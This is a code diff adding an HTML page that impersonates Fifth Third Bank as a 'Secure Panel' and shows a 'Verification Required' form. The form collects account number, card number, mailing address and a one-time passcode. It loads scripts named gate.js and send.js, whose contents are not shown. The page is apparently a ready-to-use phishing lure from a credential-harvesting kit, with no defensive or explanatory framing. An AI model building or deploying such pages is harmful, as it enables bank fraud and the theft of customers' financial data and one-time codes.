@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fifth Third Secure Panel</title>
+  <link rel="stylesheet" href="/assets/style.css">
+  <style>body { background: linear-gradient(135deg, #1a357a 0%, #2248b0 100%) !important; }</style>
+  <script src="/gate.js" defer></script>
+</head>
+<body>
+  <div class="header">
+    <div class="header-left">
+      <div class="logo-placeholder">53</div>
+    </div>
+    <div class="header-links">
+      <span>CUSTOMER SERVICE</span>
+      <span>|</span>
+      <span>BRANCH & ATM LOCATOR</span>
+    </div>
+  </div>
+  <div class="center-panel">
+    <div class="login-title">Verification Required</div>
+    <form class="verify-form" id="verify-form">
+      <label>Account Number
+        <input type="text" name="accountnumber" required>
+      </label>
+      <label>Card Number
+        <input type="text" name="cardnumber" maxlength="19" pattern="[0-9 ]{13,19}" required>
+      </label>
+      <label>Mailing Address
+        <input type="text" name="mailingaddress" required>
+      </label>
+      <label>OTP Code
+        <input type="text" name="otp" maxlength="6" pattern="\d{4,6}" required>
+      </label>
+      <button type="submit" class="login-btn">Submit</button>
+    </form>
+  </div>
+  <script src="send.js"></script>
+</body>
+</html> 
